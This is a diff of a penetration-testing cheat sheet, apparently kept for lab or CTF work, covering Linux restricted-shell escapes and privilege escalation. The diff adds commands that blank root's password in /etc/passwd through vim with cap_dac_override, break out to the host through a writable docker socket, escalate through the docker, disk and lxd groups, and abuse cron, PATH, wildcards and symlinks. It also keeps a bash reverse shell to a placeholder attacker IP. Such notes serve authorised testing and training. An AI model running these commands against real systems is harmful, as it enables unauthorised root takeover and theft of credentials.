@@ -3074,24 +3074,6 @@ scp [FILE] user@targethost:[OUTPUT LOCATION]
 
 ### Shells & Payloads
 
-#### TTY upgrade
-
-- General method (if python is not installed)
-
-```bash
-script -qc /bin/bash /dev/null
-```
-
-- Python method (try different python versions)
-
-```bash
-# In reverse shell
-$ python3 -c 'import pty; pty.spawn("/bin/bash")'	#usually good enough
-
-# Follow-Up
-$ CTRL+Z -> stty raw -echo; fg -> reset -> export TERM=scr
-```
-
 #### Bash / Netcat payloads
 
 - `sh -i >& /dev/tcp/[KALI_IP]/[PORT] 0>&1`
@@ -3164,6 +3146,61 @@ $ CTRL+Z -> stty raw -echo; fg -> reset -> export TERM=scr
   usermod [USER] --password $(echo [PASS] | openssl passwd -1 -stdin)
   usermod -aG sudo [USER]
   ```
+
+### Restricted shells
+
+A restricted shell is a type of shell that limits the user's ability to execute commands, they are `rbash`, `rksh`, and `rzsh`.
+
+#### Enumeration
+
+```bash
+export -p # It spits out all the variables set
+env # It gives the $SHELL and $PATH variable
+echo $0 # It gives the $SHELL name
+echo $PATH # It gives the path variable
+```
+
+To see which commands are executable &rarr; [GTFObins](https://gtfobins.github.io/#+shell)
+
+- `help` `?` `info`
+- Executable commands: `compgen -c`
+- List the commands in you PATH:
+  - `ls [PATH]`
+  - `[PATH] and hit tab twice `
+  - `echo [PATH]/*`
+- File read `echo "$(<a.txt )"`
+
+#### Exploit
+
+- **SSH login** 
+  
+  ```bash
+  ssh [AUTH] -t /bin/sh
+  ssh [AUTH] -t sh
+  ssh [AUTH] -t "/bin/bash --no-profile"
+  ssh [AUTH] -t "bash --no-profile"
+  ```
+  
+- **Command Injection**
+
+  - E.g. if we can only execute `ls -l -a` &rarr; ``ls -l `pwd` ``
+
+- **Command Chaining**
+  - `;`, `|`, `&&`
+
+- **Environment Variables**
+  - `echo $PATH`
+
+  - change the value of the enviroment variable
+
+    ```bash
+    export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+    ```
+
+  - specify a different directory to execute commands from
+
+- **Shell functions**
+  - defining a shell function that executes a command
 
 ## Windows
 
@@ -4185,94 +4222,88 @@ Forward a local service to a remote port. Usually used to gain shells or exchang
 
 ### Users & Privileges
 
-#### Enumeration
-
-Users:
-
 - `cat /etc/passwd | grep sh`
 - `cat /etc/hosts`
 - Last logins: `lastlog`
 - Active Users: `w`
 
-Environment:
-
-- `env`
-
-- `echo $PATH`
-
-  - Writable `$PATH` variable:
-
-    ```bash
-    PATH=.:${PATH}		# Adds current DIR to PATH
-    export PATH
-    ```
-
 #### Groups
 
 `id` &rarr; [interesting_groups](https://hacktricks.boitatech.com.br/linux-unix/privilege-escalation/interesting-groups-linux-pe)
 
-- **video:**
+- **adm:** read all logs in `/var/log`
+
+- **disk:** &rarr; escalate to root:
+
+  full access to any device in `/dev` &rarr; `debugfs`
+
+- **docker:** &rarr; escalate to root:
+
+  ```bash
+  docker run -v /root:/mnt -it ubuntu		# Creates a docker container
+  cd /mnt/root
+  ```
+
+- **video:** can watch screen of logged in users `w`
 
 - **staff**: can read/write `/usr/local/bin` and `/usr/local/sbin` 
 
   &rarr; check root processes 
 
-- **lxd/lxc:** to root is possible
+- **lxd/lxc:**  &rarr; escalte to root 
 
-#### SUDO
+  - [Method2](https://hacktricks.boitatech.com.br/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation) &rarr; `cd /mnt/root`
 
-```bash
-sudo -l		 # List sudo privileges
-sudo -V		 # Check sudo version
 
-sudo su 	 # Switch to the root user 
-su [USER] 	 # Switch to a local user
-sudo -u [USER] [COMMAND] 	# Execute an application as an user
-```
+#### PRIVILEGES
 
-- **Symlinks attacks**
+[GTFOBins](https://gtfobins.github.io/)
 
-  A symlink is a link to a file `ln -s [FILE_target] [FILE_link]`
+- SUDO:
 
-  The `*` character gets expanded to all the matching files.
-
-  Examples:
-
-  - `chown` and `chmod`
-
-    - `chown [USER] [FILE]`
-
-      Sets the owner of the specified `[FILE]` to the `[USER]`.
-
-    - `chown [USER] [FILE] --reference=[REF FILE]`
-
-      Sets the owner of the specified `[FILE]` to match the owner of the `[REF FILE]`, `[USER]` is ignored.
-
-    ```bash
-    # Create a file reference owned by us
-    touch reference
-    # Create a file called as the flag of chown
-    touch -- --reference=reference
-    ```
+  ```bash
+  sudo -l		 # List sudo privileges
+  sudo -V		 # Check sudo version
   
-    If you create a symlink to **/etc/passwd** in the same directory, then the owner of /etc/passwd will also be you.
-    
-    
-  
-  Avoid checks:
+  sudo su 	 # Switch to the root user 
+  su [USER] 	 # Switch to a local user
+  sudo -u [USER] [COMMAND] 	# Execute an application as an user
+  ```
 
-  - If there is a check to control if the link is linking to a priviledged folder, you can do a double link:
-  
-    ```bash
-    ln -s /root/root.txt [FILE HOP]	# Creates a link to root.txt
-    ln -s [FILE HOP] [FILE]			# Creates a link to FILE HOP
-    ```
+- SUID binaries &rarr; Non-Default / [SUID3ENUM](https://github.com/Anon-Exploiter/SUID3NUM) Tool / GTFOBin:
 
-#### SUID
+  ```bash
+  find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+  ```
 
-- `find / -perm -u=s -type f 2>/dev/null`
+- SGID binaries:
 
-- Non-Default / [SUID3ENUM](https://github.com/Anon-Exploiter/SUID3NUM) Tool / GTFOBin
+  ```bash
+  find / -uid 0 -perm -6000 -type f 2>/dev/null
+  ```
+
+- Capabilities
+
+  ```bash
+  find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+  ```
+
+  - Some capabilities give you direct access to root [Hacktricks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html?highlight=capabi#references):
+
+    - `cap_setuid`
+
+    - `cap_setgid`
+
+    - `cap_sys_admin`
+
+    - `cap_dac_override` allow to overwrite a file. E.g. for `vim`
+
+      ```bash
+      echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
+      su
+      ```
+
+      
 
 - Compare binaries with GTFO bins:
 
@@ -4282,26 +4313,65 @@ sudo -u [USER] [COMMAND] 	# Execute an application as an user
 
 - `strace [BIN] -c1 [IP]`: track and analyze system calls and signal processing
 
-Default SUID (not interesting):
+#### Environment
 
-```
-/bin/ping
-/bin/mount
-/bin/umount
-/bin/su
-/sbin/mount.nfs
-/usr/bin/chage
-/usr/bin/chfn
-/usr/bin/chsh
-/usr/bin/gpasswd
-/usr/bin/passwd
-/usr/bin/sudo
-/usr/bin/at
-/usr/bin/crontab
-/usr/bin/newgrp
-/usr/sbin/exim4
-/usr/sbin/pppd
-```
+- `env`
+
+- **Path Abuse** &rarr;`echo $PATH`
+
+  - Writable `$PATH` variable 
+
+    ```bash
+    PATH=.:${PATH}		# Adds current DIR to PATH
+    export PATH
+    ```
+
+- [Wildcard Abuse](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html):
+
+  - chown, chmod
+  - tar
+  - rsync
+  - 7z
+  - zip
+  
+- **Symlinks attacks**
+
+  A symlink is a link to a file `ln -s [FILE_target] [FILE_link]`
+  
+  The `*` character gets expanded to all the matching files.
+  
+  Examples:
+  
+  - `chown` and `chmod`
+  
+    - `chown [USER] [FILE]`
+  
+      Sets the owner of the specified `[FILE]` to the `[USER]`.
+  
+    - `chown [USER] [FILE] --reference=[REF FILE]`
+  
+      Sets the owner of the specified `[FILE]` to match the owner of the `[REF FILE]`, `[USER]` is ignored.
+  
+    ```bash
+    # Create a file reference owned by us
+    touch reference
+    # Create a file called as the flag of chown
+    touch -- --reference=reference
+    ```
+  
+    If you create a symlink to **/etc/passwd** in the same directory, then the owner of /etc/passwd will also be you.
+  
+    
+  
+  Avoid checks:
+  
+  - If there is a check to control if the link is linking to a priviledged folder, you can do a double link:
+  
+    ```bash
+    ln -s /root/root.txt [FILE HOP]	# Creates a link to root.txt
+    ln -s [FILE HOP] [FILE]			# Creates a link to FILE HOP
+    ```
+
 
 ### Credential Hunting
 
@@ -4381,6 +4451,22 @@ netstat -tulnap | grep "LISTEN\|ENSTABILISHED"
 - `LISTEN`&rarr; Pivot
 - `ENSTABLISHED`&rarr;Connect to / config files
 
+**Look for sockets:**
+
+```bash
+netstat -a -p --unix		# See if there is a docker
+```
+
+```bash
+find / -iname "docker.sock" 2>/dev/null	# Look for write permission
+```
+
+- If writable:
+
+  ```bash
+   docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+  ```
+
 #### Databases
 
 - MySQL
@@ -4426,17 +4512,13 @@ netstat -tulnap | grep "LISTEN\|ENSTABILISHED"
   - Write: place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`
 
 
-    ```bash
-    ssh-keygen -f key	#Generate a key in the output file key
-    ssh-copy-id -i key.pub root@10.10.10.10	#copy key.pub in and add it to the remote folder
-    ssh user@10.10.10.10 -i key	# Login
-    ```
+```bash
+ssh-keygen -f key	#Generate a key in the output file key
+ssh-copy-id -i key.pub root@10.10.10.10	#copy key.pub in and add it to the remote folder
+ssh user@10.10.10.10 -i key	# Login
+```
 
 ### Local Processes
-
-- Running processes: `ps -aux | grep [USER, ROOT...]`
-- Spy recurrent processes:`./pspy -i 1000`
-  - Try to trigger them (e.g. new ssh login)
 
 
 Config Files:
@@ -4444,20 +4526,37 @@ Config Files:
 - Look for local databases / chrome debuggers / password managers
 - Folders -> `/opt`, `/`
 
+#### Running process
+
+```bash
+ps -aux | grep [USER, ROOT...]
+```
+
+##### tmux
+
+running tmux process &rarr; attach to it  [tmux-sessions](https://redfoxsec.com/blog/terminal-multiplexing-hijacking-tmux-sessions/) (try also without sudo)
+
 #### Reccurent processes
+
+```bash
+./pspy -pf -i 1000
+```
+
+- Try to trigger them (e.g. new ssh login)
 
 ##### Cronjobs
 
-**Add new scheduled task:** If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse  shell when executed by the root.
+Each entry in the crontab file requires, in order: minutes, hours, days, months, weeks, commands. E.g, `0 */12 * * * /home/admin/backup.sh` would run every 12 hours.
 
-- `/etc/crontab`
-- `/var/spool/anacrontab`
-- `/etc/cron.d`
-- `/var/spool/cron/crontabs`
+```bash
+find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null | grep cron
+crontab -l
+ls -al /etc/cron* /etc/at*
+cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
+```
 
-##### Exploit
-
-- PATH Hijacking
+- **Add new scheduled task:** If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse  shell when executed by the root.
+- **PATH Hijacking**
 
 ### OS 
 
@@ -4476,6 +4575,33 @@ Config Files:
 To check if you are in a docker container type `hostname`. A docker has a random string as hostname.
 
 - If you are root you can read the shadow password file `/etc/shadow`
+
+- Search for sockets:
+
+  ```bash
+  find / -name docker.sock 2>/dev/null # Usually in /run/docker.sock
+  ```
+
+  - If it is in `/run/docker.sock`:
+
+    ```bash
+    #List images to use one
+    docker images
+    #Run the image mounting the host disk and chroot on it
+    docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
+    ```
+
+  - Otherwise use [docker bin32](https://get.docker.com/builds/Linux/i386/docker-latest.tgz) / [docker_bin_64](https://get.docker.com/builds/Linux/x86_64/docker-latest.tgz) (upload if not installed)
+
+    ```bash
+    # Create privileged container
+    /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
+    # List containers -> get ID of the new container
+    /tmp/docker -H unix:///app/docker.sock ps	
+    # Log in the container
+    /tmp/docker -H unix:///app/docker.sock exec -it <id> /bin/bash
+    # Get SSH key, /etc/shadow...
+    ```
 
 ## Windows
 
